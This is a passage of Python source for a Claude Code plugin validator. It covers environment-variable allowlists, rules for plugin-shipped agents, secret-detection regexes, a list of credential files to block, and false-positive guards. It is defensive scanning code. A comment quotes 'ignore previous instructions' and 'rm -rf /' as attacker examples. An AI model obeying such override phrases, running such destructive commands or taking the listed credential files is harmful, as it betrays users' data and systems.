    "FORCE_AUTOUPDATE_PLUGINS",  # discover-plugins.md
    "DISABLE_TELEMETRY",  # v2.1.98
    "DISABLE_COMPACT",  # v2.1.98
    "DISABLE_PROMPT_CACHING",  # v2.1.98
    "DISABLE_PROMPT_CACHING_1H",
    "DISABLE_PROMPT_CACHING_5M",
    "ENABLE_PROMPT_CACHING_1H",  # v2.1.108
    "ENABLE_PROMPT_CACHING_1H_BEDROCK",
    "FORCE_PROMPT_CACHING_5M",
    "FORCE_HYPERLINK",  # v2.1.94
    # OAuth / auth token vars
    "CLAUDE_CODE_OAUTH_TOKEN",  # env-vars.md
    "CLAUDE_CODE_OAUTH_REFRESH_TOKEN",
    "CLAUDE_CODE_OAUTH_SCOPES",
    # Standard Node/proxy/network vars plugins may legitimately document
    "NODE_EXTRA_CA_CERTS",  # v2.1.73
    "HTTP_PROXY",
    "HTTPS_PROXY",
    "NO_PROXY",
    # Demo / dev-only
    "IS_DEMO",  # v2.1.0
    # Phase 13 (v2.1.121) — beta-tracing + telemetry-helper additions
    "ENABLE_BETA_TRACING_DETAILED",
    "BETA_TRACING_ENDPOINT",
    "ENABLE_ENHANCED_TELEMETRY_BETA",  # alias for CLAUDE_CODE_ENHANCED_TELEMETRY_BETA
    # Skill content / hook-output substitutions (env-vars.md / skills.md v2.1.121)
    "CLAUDE_EFFORT",  # v2.1.120 — current effort level (skills/hook substitution)
    # Channel plugins (channels.md v2.1.121) — common token names
    "TELEGRAM_BOT_TOKEN",
    "DISCORD_BOT_TOKEN",
    # Bash tool behaviour (tools-reference.md v2.1.121)
    "CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR",
    # Settings/UI flags referenced in plugin docs
    "CLAUDE_CODE_HIDE_CWD",  # v2.1.119 — hides cwd in startup logo
    "DISABLE_UPDATES",  # v2.1.118 — strict superset of DISABLE_AUTOUPDATER
    "AI_AGENT",  # v2.1.120 — set by CC for subprocess attribution
    "CLAUDE_CODE_FORK_SUBAGENT",  # v2.1.117 — opt-in for forked subagents on external builds
    "CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST",  # v2.1.126 — host-managed deployment marker (Bedrock/Vertex/Foundry)
    "CLAUDE_CODE_ENABLE_GATEWAY_MODEL_DISCOVERY",  # v2.1.129 — opt-in for /v1/models gateway discovery
    "CLAUDE_CODE_FORCE_SYNC_OUTPUT",  # v2.1.129 — force-enable synchronized output for terminals auto-detection misses
    "CLAUDE_CODE_PACKAGE_MANAGER_AUTO_UPDATE",  # v2.1.129 — opt-in homebrew/winget background auto-update
    "CLAUDE_CODE_SESSION_ID",  # v2.1.132 — Bash subprocess session id (matches `session_id` passed to hooks)
    "CLAUDE_CODE_DISABLE_ALTERNATE_SCREEN",  # v2.1.132 — opt out of fullscreen alternate-screen renderer
    "CLAUDE_CODE_EFFORT_LEVEL",  # v2.1.132 — overrides the /effort picker default
    "CLAUDE_CODE_ENABLE_FEEDBACK_SURVEY_FOR_OTEL",  # v2.1.136 — re-enable session-quality survey for enterprises capturing OTEL responses
    "CLAUDE_CODE_PLUGIN_PREFER_HTTPS",  # v2.1.141 — clone GitHub plugin sources over HTTPS instead of SSH (no-SSH environments)
    # Anthropic *_SUPPORTED_CAPABILITIES — spec-correct suffix
    "ANTHROPIC_DEFAULT_OPUS_MODEL_SUPPORTED_CAPABILITIES",
    "ANTHROPIC_DEFAULT_SONNET_MODEL_SUPPORTED_CAPABILITIES",
    "ANTHROPIC_DEFAULT_HAIKU_MODEL_SUPPORTED_CAPABILITIES",
    "ANTHROPIC_CUSTOM_MODEL_OPTION_SUPPORTED_CAPABILITIES",
    "ANTHROPIC_WORKSPACE_ID",  # v2.1.141 — workload identity federation, scopes the minted token to a specific workspace when the federation rule covers more than one
}

# Env var name pattern matching for dynamic plugin env vars.
# - CLAUDE_PLUGIN_OPTION_<KEY> — exported for each userConfig key in plugin.json (v2.1.98)
# - user_config.<KEY> — GAP-57: plugins-reference.md L433 documents the
#   ``${user_config.KEY}`` substitution token (the same userConfig values,
#   referenced by dotted name inside hook/MCP commands). Recognizing this
#   prevents the skill/command substitution linter from flagging legitimate
#   ``${user_config.foo}`` references as unknown variables.
PLUGIN_ENV_VAR_PATTERNS = (
    re.compile(r"^CLAUDE_PLUGIN_OPTION_[A-Z][A-Z0-9_]*$"),
    re.compile(r"^user_config\.[a-zA-Z_][a-zA-Z0-9_]*$"),
)


def is_valid_plugin_env_var(name: str) -> bool:
    """Check if an env var name is a recognized plugin env var (exact or pattern match)."""
    if name in VALID_PLUGIN_ENV_VARS:
        return True
    return any(p.match(name) for p in PLUGIN_ENV_VAR_PATTERNS)


# =============================================================================
# Plugin-shipped agent restrictions
# =============================================================================

# Fields forbidden in plugin-shipped agents for security reasons.
# Per plugins-reference.md: "For security reasons, `hooks`, `mcpServers`,
# and `permissionMode` are not supported for plugin-shipped agents."
PLUGIN_SHIPPED_AGENT_FORBIDDEN_FIELDS: tuple[str, ...] = (
    "hooks",
    "mcpServers",
    "permissionMode",
)


def is_plugin_shipped_agent(agent_path: Path) -> bool:
    """Return True if the agent file is shipped inside a Claude Code plugin.

    Heuristic: walk up from the agent file looking for the canonical plugin
    manifest `.claude-plugin/plugin.json` within 4 parent directories. This
    covers both `<plugin>/agents/foo.md` and `<plugin>/agents/subdir/foo.md`.

    Note: only `.claude-plugin/plugin.json` is accepted. A bare `plugin.json`
    at any level is NOT treated as a plugin manifest (that would produce
    false positives for unrelated projects that happen to contain a file
    named `plugin.json`, e.g. Node.js plugin configs).
    """
    try:
        agent_path = agent_path.resolve()
    except OSError:
        return False

    current = agent_path.parent
    for _ in range(4):
        if (current / ".claude-plugin" / "plugin.json").is_file():
            return True
        if current.parent == current:
            break
        current = current.parent
    return False


def validate_plugin_shipped_restrictions(
    frontmatter: dict[str, Any],
    filename: str,
    report: ValidationReport,
    is_plugin_shipped: bool,
) -> None:
    """Flag fields forbidden in plugin-shipped agents.

    Per plugins-reference.md: "For security reasons, `hooks`, `mcpServers`,
    and `permissionMode` are not supported for plugin-shipped agents."
    Non-plugin agents (user/project) can use all three.
    """
    if not is_plugin_shipped:
        return

    for field_name in PLUGIN_SHIPPED_AGENT_FORBIDDEN_FIELDS:
        if field_name in frontmatter:
            report.major(
                f"Field '{field_name}' is not supported for plugin-shipped agents "
                "(security restriction per plugins-reference.md). "
                "Remove it from the frontmatter — it only works in user/project agents.",
                filename,
            )


# Directories to skip when scanning (cache dirs, hidden dirs, etc.)
SKIP_DIRS = {
    ".ruff_cache",
    ".mypy_cache",
    ".git",
    "__pycache__",
    ".venv",
    "node_modules",
    ".pytest_cache",
    ".tox",
    "dist",
    "build",
    "*.egg-info",
    # Dev-only directories (gitignored, not shipped)
    "*_dev",
}

# Binary file extensions — used by security and encoding validators to skip binary files
BINARY_EXTENSIONS = {
    ".png",
    ".jpg",
    ".jpeg",
    ".gif",
    ".bmp",
    ".ico",
    ".webp",
    ".svg",
    ".pdf",
    ".doc",
    ".docx",
    ".xls",
    ".xlsx",
    ".ppt",
    ".pptx",
    ".zip",
    ".tar",
    ".gz",
    ".bz2",
    ".xz",
    ".7z",
    ".rar",
    ".exe",
    ".dll",
    ".so",
    ".dylib",
    ".a",
    ".o",
    ".obj",
    ".pyc",
    ".pyo",
    ".class",
    ".jar",
    ".war",
    ".woff",
    ".woff2",
    ".ttf",
    ".otf",
    ".eot",
    ".mp3",
    ".mp4",
    ".avi",
    ".mkv",
    ".mov",
    ".wav",
    ".flac",
    ".sqlite",
    ".db",
    ".sqlite3",
}

# Known Claude Code skill frontmatter fields (shared by skill validators).
# Aligned with skills.md (v2.1.121) — 15 fields.
SKILL_FRONTMATTER_FIELDS = {
    "name",
    "description",
    "when_to_use",  # v2.1.98+ — supplemental trigger guidance, concatenated with description up to 1,536 char cap
    "argument-hint",
    "arguments",  # v2.1.121 — named positional args for `$<name>` substitution; space-separated string OR YAML list
    "disable-model-invocation",
    "user-invocable",
    "allowed-tools",
    "model",
    "context",
    "agent",
    "hooks",
    "effort",  # v2.1.80 — effort level for skill execution (low, medium, high, max)
    "paths",  # v2.1.84 — YAML list of globs to restrict skill activation to matching files
    "shell",  # v2.1.84 — shell for !`command` blocks: "bash" (default) or "powershell"
}

# Skill template-substitution variables recognised by skills.md (v2.1.121).
# Static set: keys never beginning with `$ARGUMENTS[`, `$<digit>` (positional),
# or `$<name>` (when `<name>` matches a frontmatter `arguments:` entry).
# These three patterns are recognised programmatically by the substitution
# parser, not as literal strings.
SKILL_SUBSTITUTION_VARS_LITERAL: frozenset[str] = frozenset(
    {
        "$ARGUMENTS",
        "${CLAUDE_SESSION_ID}",
        "${CLAUDE_EFFORT}",  # v2.1.120 — current effort level
        "${CLAUDE_SKILL_DIR}",  # absolute path to the directory containing SKILL.md
        "${CLAUDE_PLUGIN_ROOT}",  # plugin's root dir (env var, also resolves in skill content)
        "${CLAUDE_PLUGIN_DATA}",  # plugin's per-user data dir
        "${CLAUDE_PROJECT_DIR}",  # project root
    }
)

# Pattern matchers for the dynamic substitution forms.
SKILL_SUBSTITUTION_INDEXED_RE = re.compile(r"\$ARGUMENTS\[(\d+)\]")  # $ARGUMENTS[0]
SKILL_SUBSTITUTION_POSITIONAL_RE = re.compile(r"\$(\d+)\b")  # $0, $1, $2 …
SKILL_SUBSTITUTION_NAMED_RE = re.compile(r"\$([A-Za-z_][A-Za-z0-9_]*)\b")  # $name (must match arguments: entry)


def is_binary_file(file_path: Path) -> bool:
    """Check if a file is binary based on extension or content."""
    # Check extension first (fast path)
    if file_path.suffix.lower() in BINARY_EXTENSIONS:
        return True
    # Check file content for null bytes (binary indicator)
    try:
        with open(file_path, "rb") as f:
            chunk = f.read(8192)
            return b"\x00" in chunk
    except (OSError, PermissionError):
        return True  # Treat unreadable files as binary


def should_skip_directory(dir_name: str) -> bool:
    """Check if a directory should be skipped during scanning."""
    # Direct match against SKIP_DIRS
    if dir_name in SKIP_DIRS:
        return True
    # Wildcard patterns (e.g., *.egg-info) — use fnmatch for correct glob semantics
    for skip_pattern in SKIP_DIRS:
        if "*" in skip_pattern:
            if fnmatch.fnmatch(dir_name, skip_pattern):
                return True
    return False


# =============================================================================
# Issue #16 helpers — vendored-path skip + npm-shape detection + cpv config
# =============================================================================

# Conventional vendored-code root directory names. Paths under any of these
# subtrees are skipped from path-based, link-based, and content-based rules
# because they hold third-party code the plugin author shouldn't modify.
# Matches the same set used by scripts/cpv_codemod.py (issue #17).
VENDORED_DIR_NAMES: frozenset[str] = frozenset(
    {
        "external",
        "vendor",
        "vendored",
        "third_party",
        "third-party",
        "node_modules",
        ".venv",
        "venv",
        "dist",
        "build",
        ".git",
        "__pycache__",
    }
)

# npm-package shape regex (issue #16 category C). Strings matching any of
# these forms are NOT paths and must be excluded from backtick-to-link
# detection:
#   * @scope/name           e.g. @google/design.md, @babel/core.md
#   * @scope/name@version   e.g. @babel/standalone@7.29.0
#   * name@version          e.g. react@18.3.1, lodash@4.17.21
#   * id/version            e.g. diagram-ir/1.0, my-schema/2.3
_NPM_SHAPE_RE = re.compile(
    r"^("
    r"@[a-z0-9][\w.-]*/[a-z0-9][\w.-]*(@[\w.-]+)?"
    r"|[a-z0-9][\w.-]*@[\w.-]+"
    r"|[a-z0-9][\w.-]*/\d+\.\d+"
    r")$",
    re.IGNORECASE,
)


@functools.lru_cache(maxsize=128)
def _read_gitmodules_paths(plugin_root_str: str) -> frozenset[str]:
    """Return paths declared in `<plugin_root>/.gitmodules` (cached)."""
    plugin_root = Path(plugin_root_str)
    gm = plugin_root / ".gitmodules"
    if not gm.is_file():
        return frozenset()
    paths: set[str] = set()
    for line in gm.read_text(encoding="utf-8", errors="replace").splitlines():
        m = re.match(r"^\s*path\s*=\s*(.+?)\s*$", line)
        if m:
            paths.add(m.group(1).strip().rstrip("/"))
    return frozenset(paths)


@functools.lru_cache(maxsize=128)
def _load_cpv_config_cached(plugin_root_str: str) -> dict[str, object]:
    """Load the optional `cpv` block from `<plugin_root>/.claude-plugin/plugin.json`.

    Returns an empty dict if the manifest is missing or has no `cpv` block.
    Maintainers can add per-plugin opt-outs:

      {"cpv": {"exclude_paths":         ["external/", "vendor/"],
               "allow_root_dirs":       ["external", "SKILLS-TO-INTEGRATE"],
               "allow_orchestrator_traversal": "skills/amw-design-principles",
               "skill_size_severity":   "warning",
               "max_chars":             12000,
               "max_lines":             800}}
    """
    manifest = Path(plugin_root_str) / ".claude-plugin" / "plugin.json"
    if not manifest.is_file():
        return {}
    try:
        raw = json.loads(manifest.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return {}
    cpv_block = raw.get("cpv", {})
    return cpv_block if isinstance(cpv_block, dict) else {}


def load_cpv_config(plugin_root: Path) -> dict[str, object]:
    """Public wrapper around the cached config loader."""
    return _load_cpv_config_cached(str(plugin_root.resolve()))


def load_strip_config(plugin_root: Path) -> dict[str, object]:
    """Return the `cpv.strip` block from plugin.json (or {}).

    TRDD-793ac32a: the strip-dev-parts feature is configured per-plugin
    via this block. Schema:

        {"cpv": {"strip": {
            "extract": [
                {"src": "tests/", "submodule": "owner/<plugin>-tests",
                 "submodule_path": "dev/tests/",
                 "submodule_commit_sha": "0123abc..."}
            ],
            "keep_in_main":            ["tests/fixtures/small-snippets/"],
            "keep_dev_configs":        false,
            "symlinks_for_devs":       true,
            "allowed_submodule_urls":  ["https://github.com/Emasoft/*"],
            "require_url_allowlist":   true
        }}}

    Returns an empty dict if the plugin has no cpv.strip block. Both
    `validate_plugin.py` (publish-time allowlist rule) and
    `cpv_strip_dev.py` (the engine) consume this loader so they stay
    in lockstep on parsing.
    """
    cpv = load_cpv_config(plugin_root)
    strip = cpv.get("strip")
    return strip if isinstance(strip, dict) else {}


def is_vendored_path(rel_path: Path | str, plugin_root: Path) -> bool:
    """True if a path lives under a vendored / submodule subtree.

    Skips the path from path-based, link-based, content-based rules. Honors:
      1. Hard-coded VENDORED_DIR_NAMES (external/, vendor/, node_modules/, ...)
      2. Submodule paths declared in .gitmodules
      3. Per-plugin `cpv.exclude_paths` declared in plugin.json
    """
    rel = Path(rel_path) if not isinstance(rel_path, Path) else rel_path
    parts = rel.parts
    for part in parts:
        if part in VENDORED_DIR_NAMES:
            return True
    rel_str = str(rel).rstrip("/")
    submodules = _read_gitmodules_paths(str(plugin_root.resolve()))
    for sm in submodules:
        if rel_str == sm or rel_str.startswith(sm + "/"):
            return True
    cpv_config = load_cpv_config(plugin_root)
    raw_exclude = cpv_config.get("exclude_paths", [])
    if isinstance(raw_exclude, list):
        for entry in raw_exclude:
            if isinstance(entry, str):
                excl = entry.strip().rstrip("/")
                if excl and (rel_str == excl or rel_str.startswith(excl + "/")):
                    return True
    return False


def is_npm_package_shape(text: str) -> bool:
    """True if the string looks like an npm package id, NOT a filesystem path.

    Issue #16 category C: skip strings like `@google/design.md`,
    `react@18.3.1`, `diagram-ir/1.0` from backtick-to-link conversions.
    """
    return bool(_NPM_SHAPE_RE.match(text.strip()))


def description_has_trigger_phrases(description: str) -> bool:
    """True if a skill `description:` contains explicit trigger-phrase markers.

    Issue #16 category E: when a description packs trigger phrases like
    "use when …", "trigger with …", "include keywords …", the length cap
    should be raised — these phrases earn the longer description.
    """
    if not description:
        return False
    text = description.lower()
    markers = (
        "use when",
        "use this when",
        "trigger with",
        "trigger when",
        "use this skill when",
        "include keywords",
        "useful when",
        "invoke when",
    )
    return any(marker in text for marker in markers)


def is_orchestrator_skill(skill_name: str, skills_root: Path, threshold: int = 3) -> bool:
    """True if `skill_name` is referenced by ≥`threshold` sibling skills via `../`.

    Issue #16 category A: when an orchestrator skill owns shared rules
    that ≥3 sibling skills reference via parent-traversal, the
    `../<orchestrator>/` references should be downgraded from MAJOR to MINOR
    (or skipped entirely) — they are intentional architectural shared-library
    references, not portability bugs.

    The detection is lightweight: scan every sibling SKILL.md once, count
    references to `../<skill_name>/`, return True if the count is ≥threshold.
    """
    if not skills_root.is_dir():
        return False
    target_marker = f"../{skill_name}/"
    consumer_count = 0
    for sibling in skills_root.iterdir():
        if not sibling.is_dir() or sibling.name == skill_name:
            continue
        skill_md = sibling / "SKILL.md"
        if not skill_md.is_file():
            continue
        try:
            text = skill_md.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        if target_marker in text:
            consumer_count += 1
            if consumer_count >= threshold:
                return True
    return False


def has_numbered_prose_steps(section_text: str, min_count: int = 3) -> bool:
    """True if a section uses numbered-prose enumeration (e.g. "1. Do X. 2. Do Y.").

    Issue #16 category I: numbered-prose lists are valid Instructions
    formats — the validator's "no checklist pattern" finding should accept
    either `- [ ] Do X` checkboxes OR `1. Do X` numbered prose.
    """
    if not section_text:
        return False
    pattern = re.compile(r"^\s*\d+\.\s+\S", re.MULTILINE)
    matches = pattern.findall(section_text)
    return len(matches) >= min_count


# =============================================================================
# Security Patterns
# =============================================================================

# Patterns that indicate potential secrets/credentials
# Note: Generic API Key pattern excludes env var placeholders like ${VAR} or $VAR
SECRET_PATTERNS = [
    # AWS access-key family (Phase 2b RC-12 — 7-prefix family per vetskill).
    # Original AKIA + ASIA/AGPA/AIDA/AROA/ANPA/ANVA temporal/instance/role keys.
    # The trailing `\b` was REMOVED — real keys end in mixed alphanumerics and
    # the `\b` boundary fails when the surrounding char is also a word char
    # (e.g. concatenated with a suffix in test fixtures or env-var sources).
    (re.compile(r"\b(?:AKIA|ASIA|AGPA|AIDA|AROA|ANPA|ANVA)[0-9A-Z]{16}"), "AWS Access Key"),
    # Private Key family (Phase 2b RC-15 — added PGP per vexscan FILE-001)
    (re.compile(r"-----BEGIN (RSA |DSA |EC |OPENSSH |PGP )?PRIVATE KEY-----"), "Private Key"),
    (re.compile(r"-----BEGIN PGP PRIVATE KEY BLOCK-----"), "PGP Private Key"),
    # GitHub token family (Phase 2b RC-13 — added gho_/ghu_/ghs_/ghr_)
    (re.compile(r"\b(?:ghp|gho|ghu|ghs|ghr)_[a-zA-Z0-9]{36,}\b"), "GitHub Personal Access Token"),
    (re.compile(r"github_pat_[a-zA-Z0-9_]{22,}"), "GitHub Fine-Grained Personal Access Token"),
    # OpenAI key family (Phase 2b RC-14 — added T3BlbkFJ fingerprint guard)
    # The fingerprint pattern reduces FPs vs the bare sk- prefix
    (re.compile(r"sk-[A-Za-z0-9]{20,}T3BlbkFJ[A-Za-z0-9]{20,}"), "OpenAI API Key (with T3BlbkFJ fingerprint)"),
    (re.compile(r"\bsk-(?!proj-test|test-)[a-zA-Z0-9]{20,}\b"), "API Key (sk-... format)"),
    (re.compile(r"sk_live_[a-zA-Z0-9]{24,}"), "Stripe Secret Key"),
    (re.compile(r"pk_live_[a-zA-Z0-9]{24,}"), "Stripe Publishable Key"),
    (re.compile(r"sk-ant-[a-zA-Z0-9\-_]{80,}"), "Anthropic API Key"),
    (re.compile(r"xox[baprs]-[0-9a-zA-Z-]+"), "Slack Token"),
    (re.compile(r"AIza[0-9A-Za-z\-_]{35}"), "Google API Key"),
    (re.compile(r"npm_[a-zA-Z0-9]{36}"), "npm Access Token"),
    (re.compile(r"://[^:\s]+:[^@\s]+@[^\s]+"), "Database Connection String with Credentials"),
    (re.compile(r"SG\.[a-zA-Z0-9\-_]{22}\.[a-zA-Z0-9\-_]{43}"), "SendGrid API Key"),
    # Generic API key pattern excludes:
    #   • Environment variable placeholders: `${VAR}`, `$VAR`
    #   • Claude Code plugin-option ENV NAMES: `CLAUDE_PLUGIN_OPTION_<KEY>`
    #     — these are env-var NAMES the plugin reads, not credential VALUES.
    #   • Provider env-var name allusions: `OPENROUTER_API_KEY`, `OPENAI_API_KEY`,
    #     `ANTHROPIC_API_KEY`, etc. — common in config templates.
    (
        re.compile(
            r"api[_-]?key['\"]?\s*[:=]\s*['\"]"
            r"(?!\$[\{A-Z_]|CLAUDE_PLUGIN_OPTION_|process\.env\.|"
            r"OPENAI_API_KEY|OPENROUTER_API_KEY|ANTHROPIC_API_KEY|AZURE_API_KEY|"
            r"GOOGLE_API_KEY|HUGGINGFACE_API_KEY|<|\{)"
            r"[^'\"]{20,}['\"]",
            re.I,
        ),
        "Generic API Key",
    ),
    # JWT tokens (base64url-encoded header.payload, signature optional)
    (re.compile(r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}"), "JWT Token"),
    # AWS Secret Access Key (40-char base64 string)
    (re.compile(r"aws_secret_access_key\s*[:=]\s*['\"]?[A-Za-z0-9/+=]{40}", re.I), "AWS Secret Access Key"),
    # Phase 2b RC-13/14 — additional provider-specific tokens
    (re.compile(r"\bglpat-[A-Za-z0-9_-]{20,}\b"), "GitLab Personal Access Token"),
    (re.compile(r"\bAKID[A-Za-z0-9]{32,}\b"), "Tencent Cloud SecretId"),
    (re.compile(r"\bhf_[A-Za-z]{32,}\b"), "Hugging Face Token"),
]


# Phase 2b RC-16 — broaden KNOWN_EXAMPLE_SECRETS / placeholder bank.
# The original set was just 2 AWS examples. This expansion catches the
# many placeholder forms surveyed scanners ship in their fixtures.
EXTENDED_PLACEHOLDER_TOKENS: frozenset[str] = frozenset(
    {
        # AWS official examples
        "AKIAIOSFODNN7EXAMPLE",
        "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        # OpenAI / Anthropic test keys
        "sk-test",
        "sk-proj-test",
        "sk-demo",
        "sk-example",
        "sk-ant-api03-EXAMPLE",
        "sk-ant-test",
        # GitHub
        "ghp_EXAMPLE_TOKEN_PLACEHOLDER",
        "github_pat_EXAMPLE",
        # Generic
        "<YOUR_API_KEY>",
        "<your-api-key>",
        "<api-key>",
        "<YOUR_TOKEN>",
        "your-api-key-here",
        "your_api_key_here",
        "REPLACE_ME",
        "REPLACE-ME",
        "TODO",
        "TBD",
        "REDACTED",
        "<REDACTED>",
        "[REDACTED]",
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        "YOUR_KEY_HERE",
        "YOUR_SECRET_HERE",
    }
)

# Known example/placeholder secrets from AWS documentation and tutorials
# These are intentionally fake and appear in docs/tests — not real credentials
KNOWN_EXAMPLE_SECRETS = {
    "AKIAIOSFODNN7EXAMPLE",
    "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
}

# Generic example usernames that are acceptable in documentation
EXAMPLE_USERNAMES = {
    "username",
    "user",
    "dev",
    "developer",
    "runner",
    "admin",
    "root",
    "yourname",
    "your-name",
    "your_name",
    "yourusername",
    "your-username",
    "example",
    "test",
    "demo",
    "sample",
    "foo",
    "bar",
    "john",
    "jane",
    "me",
    "you",
    "name",
    "xxx",
    "myuser",
    "myname",
    "your",
    "my",
    "[^/\\s]+",  # Regex pattern in code
    # v2.46 FP-K — literal `...` placeholder commonly used in
    # docstring schemas and JSON examples to indicate elision:
    #   "settingsPath": "/Users/.../.llm-externalizer/settings.yaml"
    # The triple-dot is a deliberate placeholder, not a real path.
    "...",
    "…",  # Unicode horizontal ellipsis (U+2026)
}

# Patterns for hardcoded user paths (should use ${CLAUDE_PLUGIN_ROOT} instead)
# Note: These are generic patterns that may produce false positives for example paths
USER_PATH_PATTERNS = [
    re.compile(r"/Users/[^/\s]+/"),
    # re.IGNORECASE because Windows accepts both "C:\Users\..." and "c:\users\..."
    # and the scan should flag either form when detecting leaked user paths.
    re.compile(r"C:\\Users\\[^\\\s]+\\", re.IGNORECASE),
    re.compile(r"/home/[^/\s]+/"),
]

# Patterns for ANY absolute path (stricter check for plugins)
# Plugins should use relative paths or ${CLAUDE_PLUGIN_ROOT} / ${HOME}
ABSOLUTE_PATH_PATTERNS = [
    # macOS/Linux home directory paths — CRITICAL portability issue
    (re.compile(r'(?<![#!])(/(?:Users|home)/[^/\s"\'`>\]})]+/[^\s"\'`>\]})]+)'), "home directory path"),
    # Windows home directory paths
    (re.compile(r'(?<!\$\{)(?<!\$)([A-Z]:[\\\/]Users[\\\/][^\s"\'`>\]})]+)', re.IGNORECASE), "Windows home path"),
    # Unix system paths — non-portable, use env vars or relative paths instead
    # The (?<![#!]) lookbehind skips shebangs like #!/usr/bin/env or #!/bin/bash
    (
        re.compile(
            r"(?<![#!])"
            r"(?<!\$\{CLAUDE_PLUGIN_ROOT\})(?<!\$\{CLAUDE_PLUGIN_DATA\})(?<!\$\{CLAUDE_PROJECT_DIR\})(?<![\w$\{])"
            r'(/(?:usr|opt|etc|var|bin|sbin|lib|root)/[^\s"\'`>\]})]+)'
        ),
        "system absolute path",
    ),
]

# Allowed absolute path prefixes in documentation examples
# These are skipped in doc files (.md, .txt, .html) to reduce false positives
ALLOWED_DOC_PATH_PREFIXES = {
    "/tmp/",
    "/var/tmp/",
    "/var/lib/",  # Docker volumes, app data (e.g. /var/lib/postgresql/data)
    "/var/log/",  # Log path examples (e.g. /var/log/myapp/)
    "/var/run/",  # PID/socket files
    "/dev/",
    "/proc/",
    "/sys/",
    "/etc/",  # Common in config examples
    "/bin/",  # Shell references (e.g. /bin/sh, /bin/bash)
    "/sbin/",  # System binaries
    "/usr/bin/",  # Common in shebang/doc examples
    "/usr/sbin/",  # System admin binaries
    "/usr/lib/",  # Shared libraries
    "/usr/lib64/",  # 64-bit shared libraries (RHEL/Fedora)
    "/usr/libexec/",  # Helper binaries (e.g. macOS ApplicationFirewall)
    "/usr/share/",  # Shared data (e.g. /usr/share/dotnet)
    "/usr/local/",  # Common in installation examples
    "/usr/include/",  # Header files
    "/opt/",  # Common in deployment examples
    "/snap/",  # Snap packages
    "/run/",  # Runtime data
}

# System binary paths — expected for tool detection, not portability issues
_SYSTEM_BINARY_PREFIXES = ("/usr/bin/", "/usr/local/bin/", "/opt/homebrew/bin/", "/bin/", "/sbin/", "/usr/sbin/")

# Directories typically gitignored — backtick path checker skips these (runtime artifacts)
_GITIGNORED_DIR_PATTERNS = (
    "_dev/",
    "llm_externalizer_output/",
    "megalinter-reports/",
    ".venv/",
    "node_modules/",
    "dist/",
    "build/",
    "__pycache__/",
    ".pytest_cache/",
    ".ruff_cache/",
)

# Files that should never be in a plugin
DANGEROUS_FILES = {
    ".env",
    ".env.local",
    ".env.development",
    ".env.production",
    ".env.staging",
    ".env.test",
    "credentials.json",
    "secrets.json",
    "config.secret.json",
    "private.key",
    "id_rsa",
    "id_ed25519",
    "id_dsa",
    "id_ecdsa",
    ".npmrc",
    ".pypirc",
    ".netrc",
    "token.json",
    "auth.json",
    "service-account.json",
    "service_account_key.json",
    ".htpasswd",
    "kubeconfig",
    ".docker/config.json",
    "cert.pem",
    "key.pem",
    "server.pem",
    "client.pem",
    "ca.pem",
}


# =============================================================================
# RC-83 / RC-84 / RC-100 / RC-16 — FP-Reduction Helpers (Phase 0)
# =============================================================================
#
# These four complementary mechanisms suppress false positives BEFORE any new
# security rule fires. They were introduced as Phase 0 of the security
# mega-upgrade (TRDD-0f1f7889). Per the synthesis verdict, FP-reduction MUST
# ship before any new rules — otherwise CPV's own self-validation would
# drown in false hits on the validator regex source.
#
# 1. RC-83 — Code-fence tracker. Matches inside triple-backtick fenced blocks
#    are usually documentation examples, not real attacks. The `build_fence_state`
#    + `is_in_fenced_code_block` pair lets a check skip in-fence matches in O(1).
#
# 2. RC-83/100 — Negation guard. Looks for "never", "do not", "warning:",
#    "caution:" within ±N chars of a match. Documentation that warns AGAINST
#    a pattern would otherwise FP heavily. Source: skillscan, vetskill.
#
# 3. RC-16/83 — Placeholder secret + provider-host allowlist. Recognizes
#    `your-api-key`, `<placeholder>`, `${VAR}`, and known SDK hosts so
#    legitimate documentation snippets and SDK examples don't fire as
#    credential / exfil findings. Source: skillward, aguara.
#
# 4. RC-84/100 — Defensive-context demotion. `is_test_path`, `is_doc_path`,
#    `is_sample_file` plus `effective_severity` demote findings by one tier
#    when the file is a test fixture, documentation, or .env.example /
#    .template / .sample. Source: aguara, skillscan.
#
# CPV mode contract: programmatic checks call these helpers DIRECTLY. The
# semantic-validator agent (opt-in opus) does NOT consume them — it has
# its own FP-reduction via LLM judgment.


def build_fence_state(content: str) -> list[bool]:
    """Return list[bool] where index i is True if line i is inside a triple-backtick fenced block.

    The fence-marker line itself (the line containing the opening or closing
    ``` ) is reported as INSIDE the fence — so checks that skip in-fence lines
    also skip the fence markers. Pass the same `fence_state` to every check on
    the same content; lookup is O(1) per line.
    """
    in_fence = False
    state: list[bool] = []
    for line in content.split("\n"):
        if line.lstrip().startswith("```"):
            in_fence = not in_fence
            state.append(True)
            continue
        state.append(in_fence)
    return state


def is_in_fenced_code_block(line_index: int, fence_state: list[bool]) -> bool:
    """Return True if `line_index` sits inside a triple-backtick fenced block.

    `fence_state` is the output of `build_fence_state(content)`.
    """
    if not 0 <= line_index < len(fence_state):
        return False
    return fence_state[line_index]


# RC-83 / RC-100 — Negation-guard regex.
# Detects: never, don't, do not, must not, avoid, warning, caution, note —
# followed by up to 40 chars (the warned-against content sits in those chars).
NEGATION_GUARD = re.compile(
    r"\b(?:never|don'?t|do\s+not|must\s+not|avoid|warning|caution|note)\b[^\n]{0,40}",
    re.IGNORECASE,
)

# v2.46 FP-N — Trust-boundary / untrusted-data / quoted-attack guard.
# Detects defensive sections where the document is QUOTING attacker
# patterns as warnings (`"ignore previous instructions"`,
# `"rm -rf /"`, etc.) inside a section labeled UNTRUSTED, TRUST
# BOUNDARY, ATTACK, INJECTION, EXAMPLE, QUOTED. The keywords need to
# be searchable in a wider window than the basic NEGATION_GUARD's 80
# chars because TRUST BOUNDARY headers are paragraphs above their
# warned-against examples.
TRUST_BOUNDARY_GUARD = re.compile(
    r"\b(?:"
    r"untrusted(?:\s+data)?|trust\s+boundary|attacker|prompt\s+injection|"
    r"injection\s+(?:attempt|attack)|example\s+(?:attack|payload)|"
    r"warned[-\s]against|quoted(?:\s+attack)?|fixture|test\s+(?:case|payload)|"
